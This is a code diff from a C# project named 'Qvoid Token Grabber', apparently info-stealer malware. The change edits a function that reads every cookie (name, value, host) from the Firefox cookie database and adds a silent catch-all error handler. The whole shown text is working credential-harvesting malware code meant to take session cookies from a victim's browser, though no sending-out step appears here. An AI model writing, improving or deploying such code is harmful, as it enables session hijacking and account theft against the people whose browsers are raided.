@@ -50,29 +50,33 @@ namespace Qvoid_Token_Grabber.PasswordGrabbers
         }
         public List<Cookie> GetAllCookies()
         {
-            List<Cookie> cookies = new List<Cookie>();
-
-            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={FirefoxCookiePath};pooling=false"))
-            using (var cmd = conn.CreateCommand())
+            try
             {
-                cmd.CommandText = $"SELECT name,value,host FROM moz_cookies";
+                List<Cookie> cookies = new List<Cookie>();
 
-                conn.Open();
-                using (var reader = cmd.ExecuteReader())
+                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={FirefoxCookiePath};pooling=false"))
+                using (var cmd = conn.CreateCommand())
                 {
-                    while (reader.Read())
+                    cmd.CommandText = $"SELECT name,value,host FROM moz_cookies";
+
+                    conn.Open();
+                    using (var reader = cmd.ExecuteReader())
                     {
-                        cookies.Add(new Cookie()
+                        while (reader.Read())
                         {
-                            HostName = reader.GetString(2),
-                            Name = reader.GetString(0),
-                            Value = reader.GetString(1)
-                        });
+                            cookies.Add(new Cookie()
+                            {
+                                HostName = reader.GetString(2),
+                                Name = reader.GetString(0),
+                                Value = reader.GetString(1)
+                            });
+                        }
                     }
+                    conn.Close();
                 }
-                conn.Close();
+                return cookies;
             }
-            return cookies;
+            catch { return null; }
         }
     }
 }
